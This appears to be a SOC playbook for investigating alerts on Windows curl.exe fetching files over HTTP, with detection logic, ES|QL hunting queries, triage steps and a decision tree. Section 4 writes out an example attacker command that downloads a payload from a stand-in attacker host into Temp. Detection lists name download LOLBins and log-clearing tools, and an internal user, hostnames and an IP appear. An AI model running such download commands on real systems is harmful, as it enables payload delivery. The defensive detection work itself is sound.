# Potential File Transfer via Curl for Windows [NBI-4688] — SOC Investigation Playbook

**Rule ID:** `nbi-b2-potential-file-transfer-via-curl-for-windows` · **Type:** eql · **Language:** eql · **Severity:** low · **Risk:** 21 · **Platform:** Elastic Security (NBI)
**Primary index (live):** `logs-system.security*` (Windows Security Event 4688) · **Alert entities:** `$host`, `$user`, `$parent`, `$source_ip`

> Substitute the alert's real values for the `$vars` before running any query. This playbook was authored and live-validated against NBI telemetry with `$host = nim-jump-apv02`, `$user = Mahmoud.Akram`, `$parent = cmd.exe`, `$source_ip = 10.11.102.15` (a real interactive Citrix/MobaXterm jump host, a real non-privileged user, and the shared VDI egress IP, used to prove each pivot executes). Every ES|QL block below returned successfully on the live NBI cluster. Note: `curl.exe` itself had **zero** executions in the validated 4-hour window — the curl-anchored queries execute and return nothing, which is expected and is **not** evidence of safety (the rule fires on a real curl execution). Empty result never equals safe.

---

## 1. Purpose

This playbook drives triage and investigation of the **Potential File Transfer via Curl for Windows** detection on NBI's Elastic Security deployment. The rule fires when the **built-in Windows `curl.exe`** (shipped in `C:\Windows\System32\curl.exe` / `SysWOW64`) is started with a command line that contains **`http`**, launched by a **shell / scripting / LOLBin parent** (`cmd`, `powershell`, `rundll32`, `explorer`, `conhost`, `forfiles`, `wscript`, `cscript`, `mshta`, `hh`, `mmc`), while running under a **non-SYSTEM / non-System-integrity** account. In short: an interactive or scripted context used the native curl to fetch something over HTTP(S).

`curl.exe` is a legitimate, Microsoft-signed, built-in transfer utility — and for exactly that reason it is a favourite **ingress tool transfer** living-off-the-land binary: after gaining a foothold, an attacker uses it to pull a second-stage payload, tool, or configuration from a remote server over ordinary web traffic that blends with normal browsing. The same command is also run legitimately by developers, installers, and admin scripts.

The analyst's job is to determine, quickly and defensibly, whether this curl invocation fetched an attacker payload, performed an authorised/benign transfer, or is an unbaselined-but-legitimate automation — and to classify the alert as **true_positive**, **false_positive**, **misconfiguration**, or **needs_escalation** with evidence attached. The URL curl contacted, the parent that launched it, and what executed on the host afterwards decide it.

## 2. Detection Summary

The deployed rule is an **EQL** process rule. Faithful plain-English of the deployed trigger logic: a Windows **process start (Event 4688)** for **`curl.exe`** (image in `System32` or `SysWOW64`) whose **command line contains `http`**, where the **parent process** is one of the shell/scripting/LOLBin set (`cmd.exe`, `powershell.exe`, `rundll32.exe`, `explorer.exe`, `conhost.exe`, `forfiles.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `hh.exe`, `mmc.exe`), and the process is **not** running as SYSTEM / at System integrity.

One-line Kibana KQL detection filter (for fast pivoting in Discover / Timeline):

```kql
event.code : "4688" and process.name : "curl.exe" and process.command_line : *http* and process.parent.name : ("cmd.exe" or "powershell.exe" or "rundll32.exe" or "explorer.exe" or "conhost.exe" or "forfiles.exe" or "wscript.exe" or "cscript.exe" or "mshta.exe" or "hh.exe" or "mmc.exe") and not user.name : "SYSTEM"
```

Why each clause exists: the `http` substring narrows to network fetches (not local `curl file://` or `--help`); the shell/LOLBin parent set is where a hands-on operator or a malicious script would spawn curl; the SYSTEM/System-integrity exclusion removes the noisy machine-context servicing/telemetry curl calls and focuses on **interactive or scripted user activity**, which is where ingress transfer lives. On NBI the command-line clause has a **major caveat**: `process.command_line` is only ~50% populated (see §8), so the deployed EQL and this playbook corroborate the URL from `process.args` (multivalued → `MV_CONCAT(process.args, " ")`); an empty `command_line` is not proof of a benign fetch.

## 3. Alert Meaning

An alert means: **on `$host`, a non-SYSTEM account (`$user`) launched the native `curl.exe` from a shell/scripting parent (`$parent`) with an HTTP(S) URL on the command line.** Because 4688 records a process *start*, the fetch has **already been invoked** — the investigative question is not *did a curl HTTP request happen* (it did) but *what was fetched, from where, and what happened to it*.

`curl.exe` has been shipped in-box on Windows 10/11 and Windows Server since 2018, so it is present and signed on every modern host — no dropper needed. That makes it a clean ingress primitive: one signed, allow-listed binary can retrieve an arbitrary remote file over HTTP(S)/FTP, optionally writing it straight to disk (`-o`/`-O`) in a location of the attacker's choosing. The alert is therefore the observable signature of the **download step** of an intrusion. Whether that download is a malware payload or a developer pulling a package is what the URL, the parent, and the post-transfer execution reveal.

## 4. Typical Attacker Behavior

Ingress tool transfer via curl typically proceeds in a tight sequence:

1. The attacker already has **code execution** on the host (phishing payload, malicious macro/script, a foothold on a shared jump/VDI host, or a hands-on-keyboard operator in an RDP/SSH session).
2. From a shell or script host they run curl to fetch a second stage — commonly `curl -o C:\Users\<u>\AppData\Local\Temp\<name>.exe http://<attacker>/<payload>`, or a PowerShell/`cmd` one-liner that curls and then executes. Frequent tells: an **output flag** (`-o`/`-O`) writing to `Temp`/`AppData`/`Downloads`/`ProgramData`; a **raw IP**, a **non-corporate domain**, a **high/uncommon port**, or a URL ending in `.exe`/`.dll`/`.ps1`/`.bat`/`.bin`; `-k`/`--insecure` to ignore TLS validation; and piping curl output straight into a shell/interpreter.
3. The fetched file is **executed** — often from the same non-standard path it was written to — installing a beacon, tool, or ransomware component.
4. Follow-on: persistence (service/scheduled task/Run key), credential access, defence tampering, and outbound C2 from the new payload.

Related tradecraft to expect around the curl call: other download LOLBins as alternatives or fallbacks (`certutil -urlcache`, `bitsadmin /transfer`, `certreq -Post`, `desktopimgdownldr`, PowerShell `Invoke-WebRequest`), a scripted parent (`wscript`/`cscript`/`mshta`/`forfiles`) rather than an interactive shell, and an Office or browser ancestor pointing to phishing-driven delivery. A raw-IP or freshly-registered domain fetched by a script host, followed by a new binary running from `AppData`, is the textbook malicious pattern.

## 5. Common False Positives

- **Developers and admins** pulling packages, scripts, or API responses from internal mirrors or known vendor endpoints — `curl https://<internal-mirror>/...`, `curl https://api.<vendor>.com/...` — run interactively from `cmd`/`powershell` under `explorer.exe`.
- **Installers and setup routines** that shell out to curl to fetch components or check for updates during software installation.
- **Automation / CI / configuration-management scripts** that use curl for health checks, artifact retrieval, or webhook calls against recognised destinations.
- **Monitoring, update, or telemetry agents** that invoke curl programmatically as part of their normal operation.

Discipline: a transfer confirmed to a documented internal/vendor URL by a known developer/installer/admin context is **false_positive (authorised)** — verified against role/change, never assumed. A curl call **positively proven to have failed** (host unreachable / HTTP error, nothing written or executed) is recorded as a **blocked attempt** (false_positive), documented as such and **never labelled "benign"**. Absence of a follow-on execution is *not* on its own a clearance — curl may have pulled data/config only, or the file may not have run yet.

## 6. Environment-Specific False Positives (NBI)

Validated against NBI's live `logs-system.security*` over the last hours:

- **`curl.exe` has a zero baseline in NBI.** Across the estate in a 4-hour window, `curl.exe` appeared **0 times** on the 4688 stream. Native curl use by non-system accounts is rare here, so **any** firing is a genuine anomaly with no noisy legitimate source to tune out — but also no in-environment allow-list to lean on. Treat each hit on its own merits.
- **Jump/VDI hosts carry heavy interactive dev tooling that mimics "bad" patterns.** On `nim-jump-apv02` (a Citrix/MobaXterm jump host with ~32 interactive users), the validated `$user` (`Mahmoud.Akram`) runs an SSH/terminal client — `MoTTYnew.exe`, `XWin_MobaX.exe`, `xkbcomp_w32.exe` — from `C:\Users\MAHMOU~1.AKR\AppData\Roaming\MobaXterm\slash\bin\`. That is a binary executing from a **user-writable AppData path**, which is exactly the shape a naive post-transfer hunt (§15.10) would flag — yet it is benign, sanctioned tooling. On these hosts, a non-standard-path binary is a *lead*, not a verdict: correlate it to an actual curl fetch and a suspicious URL before escalating.
- **Command-line capture is bimodal.** `process.command_line` is enabled on some servers (~100% on hosts like `nim-est-apv07`) and **absent on the jump/VDI tier** where interactive curl is most plausible. Expect the URL/flags to sometimes be recoverable only from `process.args`, and sometimes not present at all — which pushes ambiguous cases to **needs_escalation** with a proxy pull, not to a benign close.
- **No NBI benign-true-positive is on record for this rule.** There is no environment-specific allow-list. Do not create a blanket host/user exception off a single alert; scope any exception to an exact URL/destination + parent + user only after a documented authorised cause.

## 7. Investigation Prerequisites

- Access to NBI Elastic Security (Discover, Timeline, Alerts) and the `_query` ES|QL API, read-only.
- The alert's entity values: `host.name` (`$host`), the acting `user.name` (`$user`), the launching `process.parent.name` (`$parent`), and — if the session is remote — the logon `source.ip` (`$source_ip`). Where the host audits it, the curl `process.command_line` / `process.args` (the URL and flags).
- Awareness of NBI's telemetry reality (§8): **Windows Security 4688 only — no Sysmon, no Elastic Defend/EDR, no process-to-network (5156) events, no process hashes, and host-dependent command-line capture.** The *actual* HTTP fetch (destination, bytes, response) is **not collectable** in this index; the URL is read from the command line/args, and the connection must be corroborated out-of-band via proxy/DNS/EDR.
- The current UTC time and a tight incident window (every query here uses `@timestamp >= NOW() - 4 hours`; widen only in Discover with care and only as far as the investigation needs).

## 8. Required Data Sources

**Live and used by this playbook:**

- **`logs-system.security*`** — Windows Security Event Log; the only live index the rule declares. Event **4688** (a new process has been created) is the anchor: `event.type = "start"`, `event.action = "created-process"`. Supporting events used in pivots: **4624/4625/4634/4647** (logon/logoff), **4672** (special privileges assigned), **4698** (scheduled task created), **4720** (account created), **7045** (service installed), **4768/4769** (Kerberos), **5140/5145** (share access), **1102** (audit log cleared), **4719** (audit policy changed).

**Field population on 4688 (measured live on NBI):**

| Field | Population | Note |
|---|---|---|
| `process.name`, `process.executable` | ~100% | Child image name + full path — matches `curl.exe` and any post-transfer binary. |
| `process.parent.name`, `process.parent.executable` | ~99.7% | The launching parent — this is where `$parent` is matched. |
| `process.pid`, `process.parent.pid` | ~100% | Used for **PID-based lineage** (no Sysmon `process.entity_id` on NBI). |
| `user.name`, `user.domain` | ~100% | Acting user + domain/NetBIOS context. |
| `host.name`, `host.os.type` | ~100% | `host.os.type` value is literally `windows`. |
| `source.ip` | network logons only | Present on 4624 type 3/10 and 4769; **null on local interactive (type 2)**. |
| `process.command_line` | **host-dependent** (~50% estate-wide) | **Bimodal.** Enabled on some servers, **absent (0%) on the jump/VDI hosts** where interactive curl is most plausible. The URL/flags live here when present. |
| `process.args` (multivalued) | tracks `command_line` | Corroborate the URL with `MV_CONCAT(process.args, " ")`; both are null on command-line-less hosts. |

**Declared by the rule but DEAD in NBI (0 docs — never query):** `endgame-*`, `logs-crowdstrike.fdr*`, `logs-endpoint.events.process-*`, `logs-m365_defender.event-*`, `logs-sentinel_one_cloud_funnel.*`, `logs-windows.forwarded*`, `logs-windows.sysmon_operational-*`, `winlogbeat-*`.

**Telemetry-blocked signals for this technique (state plainly):**

- **No process-to-network telemetry.** This index has no `5156` (Windows Filtering Platform connection) events and no Sysmon/Defend network events, so the **actual HTTP fetch — destination host, port, bytes, response code — cannot be seen here.** The URL is inferred from the command line/args only; corroborate the connection via proxy (`logs-fortinet_fortigate.log-*` / FortiWeb under `logs-tcp.generic-*`), DNS, or EDR out of band.
- **No process hashes** (`process.hash.*` absent on 4688 — no Sysmon/EDR), so the fetched file's reputation must be obtained out-of-band.
- **Command-line bimodality** means some transfers are under-specified in this index (URL/flags simply absent) without EDR.

Empty result ≠ safe: because the network fetch is not collected and the command line is only ~50% populated, absence of a visible URL or follow-on never proves the transfer was benign.

## 9. MITRE ATT&CK Mapping

From the rule's `threat[]`:

- **Tactic: Command and Control (TA0011)** — https://attack.mitre.org/tactics/TA0011/
- **Technique: T1105 — Ingress Tool Transfer** — https://attack.mitre.org/techniques/T1105/
- **Technique: T1071.001 — Application Layer Protocol: Web Protocols** — https://attack.mitre.org/techniques/T1071/001/

The behaviour is primarily **ingress tool transfer** (pulling tooling/payload onto the host, T1105) carried over **web protocols** (HTTP/HTTPS, T1071.001). If the fetched file is subsequently executed, the incident extends into Execution and whatever the payload then does (persistence, credential access, impact) — assessed in §17.

## 10. Severity Guidance

Deployed severity is **low** (risk 21) — this is a building-block signal, most useful correlated with what curl fetched and what ran next. Adjust the *effective* incident priority using NBI-specific context:

- **Raise toward high/critical** when: the URL is a **raw IP**, a **non-corporate / newly-registered domain**, a **high/uncommon port**, or targets a `.exe`/`.dll`/`.ps1`/`.bin`; an **output flag** wrote to `Temp`/`AppData`/`Downloads`; `-k`/`--insecure` or a pipe-to-shell is present; the parent is a **scripted LOLBin** (`wscript`/`cscript`/`mshta`/`forfiles`) or an **Office/browser** ancestor; a **new binary executes from a non-standard path** shortly after (§15.10); or the host is a **server/Tier-0** system.
- **Keep at low–medium** for an interactive `cmd`/`powershell` (under `explorer.exe`) fetch to a plausible internal/vendor URL by a developer/admin with no follow-on execution — pending confirmation.
- **Lower only** to **false_positive (authorised)** when a change ticket, known installer, or documented automation is positively matched to the exact URL/destination + parent + user + time — documented, not assumed. Because NBI's baseline for curl is effectively zero, the default posture is "investigate fully".

## 11. Triage Process (Tier 1)

Target: reach a hold/confirm/escalate decision in ~15 minutes.

1. **Read the alert entities.** Note `$host`, `$user`, `$parent`, timestamp, and — if present — the curl `process.command_line`. Confirm the process really is `curl.exe` and the parent is a shell/LOLBin.
2. **Recover the URL and flags** with §14.1 / §15.2b (`COALESCE(command_line, MV_CONCAT(args," "))`). Read the destination and any `-o`/`-O` target.
3. **Judge the URL.** Raw IP / non-corporate domain / high port / payload-extension target / `-o` to temp = payload-fetch behaviour. A known internal/vendor URL fetched interactively leans benign. `-k` and pipe-to-shell raise suspicion. An empty command line is **not** a benign result — escalate to get it from proxy/EDR.
4. **Judge the parent** (§15.3). An interactive `cmd`/`powershell` under `explorer.exe` (developer/admin) leans benign; a script host / LOLBin / Office / browser parent leans malicious ingress.
5. **Check for post-transfer execution** (§15.10): a new binary running from `Temp`/`AppData`/`Downloads` shortly after the fetch is the strong "downloaded-and-ran" signal.
6. **Decide:** suspicious URL + scripted parent and/or a downloaded binary executing → escalate to Tier 2 as **true_positive** candidate; positively matched authorised transfer → **false_positive (authorised)**; proven-failed fetch → **false_positive (blocked)**; URL/execution unresolvable from telemetry → **needs_escalation**. Never close as benign without proof.

## 12. Investigation Workflow (Tier 2 / Tier 3)

1. **Confirm the transfer and its URL** (§14.1, §15.2b) — the URL, any output file, and the flags are the primary classification signals.
2. **Characterise the launching parent** (§15.3) — interactive/dev context vs a script host/LOLBin driving an automated fetch; walk the lineage by PID (§15.3, §17.5) since NBI has no Sysmon entity IDs.
3. **Determine post-transfer execution** (§15.10, §17.5) — new binaries from non-standard paths by `$user` on `$host` after the fetch, matched by timestamp against the curl call.
4. **Scope the user and host** — where else `$user` executed (§15.4), what is normal vs rare for `$host` (§15.5), and where the session originated (§15.6, §15.12).
5. **Validate the attack chain** (§17) — persistence installed (§17.2), privilege context (§17.3), lateral movement (§17.1), defence evasion / log clearing (§17.4), and downstream impact of any executed payload (§17.5).
6. **Build the timeline** (§16) so the sequence parent → curl fetch → downloaded file → execution → follow-on is explicit and defensible.
7. **Corroborate the network side out-of-band** — resolve the URL/destination and whether a file was actually retrieved via proxy/DNS/EDR (not visible in `logs-system.security*`).

## 13. Decision Tree

```
Alert: non-SYSTEM $user launched curl.exe with an http(s) URL from $parent on $host (§14 confirms the 4688)
│
├─ Anchor 4688 not reproducible / process is not curl.exe / parent not a shell-LOLBin
│     → likely field-parsing edge; re-open in Discover. If truly absent → needs_escalation (data-quality)
│
├─ Anchor confirmed → recover the URL/flags (§14.1/§15.2b) and assess parent + post-exec
│   │
│   ├─ Suspicious URL/payload target (raw IP / non-corp domain / high port / .exe|.dll|.ps1|.bin / -o to temp)
│   │   AND scripted-LOLBin parent AND/OR a downloaded binary executing from a non-standard path (§15.10)
│   │     → true_positive (curl ingress transfer / payload delivery) — Containment (§18); escalate per §21
│   │
│   ├─ Transfer targets a documented internal/vendor URL run by a developer/installer/admin script
│   │   (authorisation verified, not assumed)
│   │     → false_positive (authorised/benign transfer) — attach the ticket/role evidence
│   │
│   ├─ Fetch positively proven to have failed (host unreachable / HTTP error, nothing written or run)
│   │     → false_positive (blocked attempt — documented as blocked, never "benign")
│   │
│   ├─ Legitimate-but-unbaselined automation/script curls a recognised benign destination, no payload execution
│   │     → misconfiguration (register the source/destination)
│   │
│   └─ URL cannot be recovered (command_line/args empty) OR whether a fetched file executed is unresolvable
│         → needs_escalation — pull the full curl command + proxy logs; hand to Tier 3/IR with gaps named
```

## 14. Validation Queries

### 14.1 Confirm the curl request and its URL on the alert host

Verbatim from the deployed playbook's INV-01. Recovers, on `$host`, the curl command line — the URL, any output-file (`-o`/`-O`), and the parent — corroborating the URL from `process.args` when `process.command_line` is empty. (In this validation window it returns **nothing** — `curl.exe` had zero executions estate-wide; the query still executes. Empty ≠ safe.)

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND TO_LOWER(process.name) == "curl.exe" AND @timestamp >= NOW() - 4 hours
| EVAL cl = TO_LOWER(COALESCE(process.command_line, MV_CONCAT(process.args, " ")))
| WHERE cl LIKE "*http*"
| KEEP @timestamp, user.name, process.parent.name, process.executable, process.command_line, process.args
| SORT @timestamp DESC
| LIMIT 20
```

### 14.2 Reproduce the rule estate-wide (confirm the detection logic)

Faithful ES|QL translation of the deployed EQL trigger: curl.exe with an `http` URL, launched by a shell/LOLBin parent, not as SYSTEM. Confirms whether the anchor condition is currently satisfied anywhere on NBI (normally 0 — a non-zero result is immediately notable).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688" AND event.type == "start"
    AND TO_LOWER(process.name) == "curl.exe"
    AND TO_LOWER(process.parent.name) IN ("cmd.exe","powershell.exe","rundll32.exe","explorer.exe","conhost.exe","forfiles.exe","wscript.exe","cscript.exe","mshta.exe","hh.exe","mmc.exe")
    AND NOT TO_LOWER(user.name) == "system"
| EVAL cl = TO_LOWER(COALESCE(process.command_line, MV_CONCAT(process.args, " ")))
| WHERE cl LIKE "*http*"
| KEEP @timestamp, host.name, user.name, process.parent.name, process.executable, process.command_line
| SORT @timestamp DESC
| LIMIT 100
```

## 15. Investigation Queries — Entity Pivots

### 15.1 Entity pivoting

Anchor on the alert's entity set: retrieve every `curl.exe` execution on `$host` with the full 4688 field set, so the URL, output file, parent, pid, and user are confirmed from real data. (Returns nothing in the validated window — curl was absent estate-wide — which is the honest anchor state; the rule fired on a real execution, so read the alert document and widen in Discover if needed.)

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) == "curl.exe"
| KEEP @timestamp, host.name, user.name, user.domain, process.parent.name, process.parent.pid, process.pid, process.executable, process.command_line, process.args
| SORT @timestamp DESC
| LIMIT 50
```

### 15.2 Process investigation

**15.2a — Estate prevalence of `curl.exe`.** How often native curl runs across NBI, by whom and under which parent. A near-zero estate baseline (the NBI reality) makes any hit high-signal. `COUNT` is scoped to a single image name over 4h (safe — not a leading-wildcard scan).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND TO_LOWER(process.name) == "curl.exe"
| STATS executions = COUNT(*), hosts = COUNT_DISTINCT(host.name), users = COUNT_DISTINCT(user.name) BY process.parent.name
| SORT executions DESC
| LIMIT 50
```

**15.2b — Full curl command line and flags on `$host`.** All curl invocations on the host (not just those matching `http`), surfacing the URL and every flag (`-o`/`-O`/`-k`/`--data`) via `MV_CONCAT(process.args," ")` where the host audits it. Honestly returns nothing for command-line-less hosts and when curl did not run.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND TO_LOWER(process.name) == "curl.exe"
| EVAL arguments = MV_CONCAT(process.args, " ")
| KEEP @timestamp, user.name, process.parent.name, process.executable, process.command_line, arguments
| SORT @timestamp DESC
| LIMIT 50
```

### 15.3 Parent-Child process analysis

**15.3a — Characterise the launching parent (`$parent`) on `$host`.** Verbatim from the deployed playbook's INV-02. Establishes whether `$parent` is an interactive shell/dev context or a script host/LOLBin driving automated fetches, by profiling everything it spawned. (Validated live: on `nim-jump-apv02`, `cmd.exe` spawned `conhost.exe`, `reg.exe`, `acregl.exe`, `wevtutil.exe`, `PING.EXE`, `powershell.exe`.)

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND process.parent.name == "$parent" AND @timestamp >= NOW() - 4 hours
| STATS spawned = COUNT(*), users = COUNT_DISTINCT(user.name), distinct_children = COUNT_DISTINCT(process.name) BY process.name
| SORT spawned DESC
| LIMIT 20
```

**15.3b — The `$user` + `$parent` process tree on `$host`.** What this specific user ran under this parent, with PIDs, so the curl call can be placed in its interactive/scripted lineage. NBI has no Sysmon `process.entity_id`, so lineage is reconstructed from `process.pid`/`process.parent.pid` (corroborate with `process.parent.name`; PIDs are reused).

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host" AND user.name == "$user" AND process.parent.name == "$parent"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable
| SORT @timestamp DESC
| LIMIT 100
```

### 15.4 User investigation

Where has `$user` executed processes, and how broad is their footprint in the window? A normally host-bound interactive user suddenly spanning many hosts, or running download LOLBins, is itself suspicious.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND user.name == "$user"
| STATS executions = COUNT(*), distinct_procs = COUNT_DISTINCT(process.name) BY host.name
| SORT executions DESC
| LIMIT 20
```

### 15.5 Host investigation

Baseline `$host` by surfacing its **rarest** process/parent pairs first — download LOLBins (`curl`, `certutil`, `bitsadmin`), one-off tooling, and out-of-place children stand out against routine session churn.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
| STATS executions = COUNT(*), users = COUNT_DISTINCT(user.name) BY process.name, process.parent.name
| SORT executions ASC
| LIMIT 40
```

### 15.6 IP investigation

**15.6a — Where did `$user` log in from on `$host`.** `source.ip` is present on network (type 3) and RemoteInteractive/RDP (type 10) logons; null on local interactive (type 2). For a jump/VDI host this reveals the operator's origin. (Validated live: `Mahmoud.Akram` on `nim-jump-apv02` from `10.11.102.15`, logon types 3/10/7.)

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND host.name == "$host" AND user.name == "$user"
    AND source.ip IS NOT NULL
| STATS logons = COUNT(*) BY source.ip, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 20
```

**15.6b — Reverse pivot on the source IP.** Who else authenticated from `$source_ip`? In NBI this frequently returns *shared* VDI/jump infrastructure (one egress IP fronting many users), so treat `source.ip` as a weak individual identifier and always correlate IP + user + host.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4624"
    AND source.ip == "$source_ip"
| STATS logons = COUNT(*) BY user.name, host.name, winlog.event_data.LogonType
| SORT logons DESC
| LIMIT 25
```

### 15.7 Domain investigation

N/A — DNS/network-domain telemetry is not collected for NBI Windows hosts. There is no Sysmon (`logs-windows.sysmon_operational-*` dead), no Elastic Defend network/DNS events (`logs-endpoint.events.network*` dead), and Windows Security 4688 carries no domain-contacted field. The domain curl contacted is only ever visible **inside the curl command line/args** (§15.2b), not as a resolvable domain field. Alternative: if the host egresses through the FortiGate, pivot on the host's IP in `logs-fortinet_fortigate.log-*` out of band to resolve the destination; otherwise obtain DNS-cache/network data from the host directly during response.

### 15.8 URL investigation

N/A as a dedicated field — Windows Security 4688 has **no URL field**, and there is no proxy/web index tied to `$host` inside `logs-system.security*`. The only URL available is the string in the curl command line/args, recovered in §14.1 / §15.2b. Alternative: corroborate and enrich the URL against perimeter web/proxy logs (`logs-fortinet_fortigate.log-*` / FortiWeb under `logs-tcp.generic-*`) by the host's IP and time window if this escalates to network investigation, and submit the URL to URL-reputation services out of band.

### 15.9 Hash investigation

N/A — process hashes are not collected. `process.hash.*` does not exist on 4688 (no Sysmon/EDR on NBI), so neither `curl.exe` nor the fetched file can be reputation-checked from telemetry. Alternative: obtain the SHA-256 of any downloaded binary (identified by its `process.executable` path in §15.10) directly from `$host` during response with PowerShell `Get-FileHash`, then check VirusTotal / Talos / Hybrid-Analysis out of band.

### 15.10 File investigation

The strongest file artifact available on NBI is the **on-disk image path of anything that ran after the fetch**. Verbatim from the deployed playbook's INV-03: new binaries by `$user` on `$host` executing from **non-standard paths** (outside `System32`/`SysWOW64`/`Program Files`/`Windows`) — the "downloaded-and-ran" signal. Match timestamps against the curl call in §14.1. (Validated live: on `nim-jump-apv02`, `Mahmoud.Akram` ran `MoTTYnew.exe` / `XWin_MobaX.exe` / `xkbcomp_w32.exe` from `AppData\Roaming\MobaXterm\...` — a **benign** SSH client, illustrating why a non-standard path is a lead to correlate, not a verdict.)

```esql
FROM logs-system.security-*
| WHERE event.code == "4688" AND host.name == "$host" AND user.name == "$user" AND @timestamp >= NOW() - 4 hours
| EVAL exe = TO_LOWER(process.executable)
| WHERE NOT exe LIKE "*system32*" AND NOT exe LIKE "*syswow64*" AND NOT exe LIKE "*program files*" AND NOT exe LIKE "*windows*"
| STATS execs = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY process.name, process.executable
| SORT execs DESC
| LIMIT 20
```

### 15.11 Email investigation

N/A — no email/message telemetry is in scope for this host-based process event on NBI. There is no live O365/Exchange message index (`logs-m365_defender.*` carries alerts only, not mail items). Alternative: if the curl foothold was delivered via phishing, pivot in the mail-security stack out of band using `$user` as the recipient and the incident timeframe.

### 15.12 Authentication investigation

Reconstruct `$user`'s logon/logoff activity on `$host` (session start, type, source, and end) to bound the session in which curl ran and to spot anomalies (e.g. a network/RemoteInteractive logon where an interactive one is expected). Anchors the operator origin for the timeline.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4625", "4634", "4647")
    AND host.name == "$host" AND user.name == "$user"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY event.code, winlog.event_data.LogonType, source.ip
| SORT events DESC
| LIMIT 30
```

## 16. Timeline Reconstruction

Build a time-ordered process-creation stream for `$user` on `$host`. Because `process.pid`/`process.parent.pid` are ~100% populated, the chain (`explorer → cmd → curl → <downloaded>.exe`) is legible directly, letting you place the curl fetch and any follow-on execution in sequence with surrounding activity.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4688"
    AND host.name == "$host"
    AND user.name == "$user"
| KEEP @timestamp, process.parent.name, process.parent.pid, process.name, process.pid, process.executable, process.command_line
| SORT @timestamp ASC
| LIMIT 200
```

Anchor the read on the alert timestamp and read outward. For a broader host timeline (all users) drop the `user.name` predicate. If the host lacks command-line auditing, lineage + image paths are your narrative and the command line will be null — corroborate the fetch time against proxy/DNS out of band.

## 17. Attack-Chain Validation

### 17.1 Lateral movement validation

Did `$user` authenticate or reach shares on hosts **other than** `$host` in the window? Network/explicit-credential logons and Kerberos ticketing to new systems after an ingress transfer are the signal — a fetched tool used to pivot. (Expect some legitimate DC ticketing; weigh it against role. Empty is a clean result, not a guarantee.)

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code IN ("4624", "4648", "4768", "4769", "5140")
    AND user.name == "$user"
    AND host.name != "$host"
| STATS events = COUNT(*) BY host.name, event.code, winlog.event_data.LogonType
| SORT events DESC
| LIMIT 30
```

### 17.2 Persistence validation

Look for persistence primitives on `$host` in the window — service installs (`7045`), scheduled tasks (`4698`), account creation (`4720`), and 4688 executions of `schtasks.exe`/`reg.exe`/`sc.exe`/interpreters that a downloaded payload would use to persist.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("schtasks.exe", "reg.exe", "sc.exe", "at.exe", "powershell.exe", "wscript.exe", "cscript.exe", "rundll32.exe", "mshta.exe"))
        OR event.code == "7045"
        OR event.code == "4720"
        OR event.code == "4698"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 40
```

### 17.3 Privilege escalation validation

Enumerate which accounts received **special (admin-equivalent) privileges** on `$host` via Event 4672, and compare against `$user`. A curl ingress transfer by a non-privileged user that is quickly followed by that same user appearing in 4672 (or by a downloaded payload running elevated) indicates a successful escalation chained off the download.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND event.code == "4672"
    AND host.name == "$host"
| STATS special_priv_logons = COUNT(*) BY user.name
| SORT special_priv_logons DESC
| LIMIT 25
```

### 17.4 Defense evasion validation

Check for evidence-destruction / defence-tampering on `$host`: event-log clearing (`1102`), audit-policy change (`4719`), and 4688 executions of `wevtutil.exe`/`fsutil.exe`/`vssadmin.exe`/`wmic.exe`/`cipher.exe`/`sdelete`. A downloaded tool that then clears logs or deletes shadow copies escalates the incident materially.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND (
        (event.code == "4688" AND TO_LOWER(process.name) IN ("wevtutil.exe", "fsutil.exe", "vssadmin.exe", "wmic.exe", "cipher.exe", "sdelete.exe", "sdelete64.exe"))
        OR event.code == "1102"
        OR event.code == "4719"
    )
| STATS events = COUNT(*) BY event.code, process.name, user.name
| SORT events DESC
| LIMIT 30
```

### 17.5 Impact assessment

Quantify what the launching parent actually spawned on `$host` — the set of children that `$parent` produced, which bounds what the curl call and any downloaded payload led to. A shell that spawned only benign children is a different incident from one that spawned recon, credential, or persistence tooling.

```esql
FROM logs-system.security-*
| WHERE @timestamp >= NOW() - 4 hours
    AND host.name == "$host"
    AND event.code == "4688"
    AND process.parent.name == "$parent"
| STATS children = COUNT(*), distinct_children = COUNT_DISTINCT(process.name) BY process.name, user.name
| SORT children DESC
| LIMIT 30
```

## 18. Containment

- **Isolate `$host`** (network-contain / quarantine) if a true_positive is confirmed, to stop the downloaded payload's execution and any C2. On a shared jump/VDI host, coordinate with IT to avoid dropping unrelated user sessions unnecessarily, but prioritise containment.
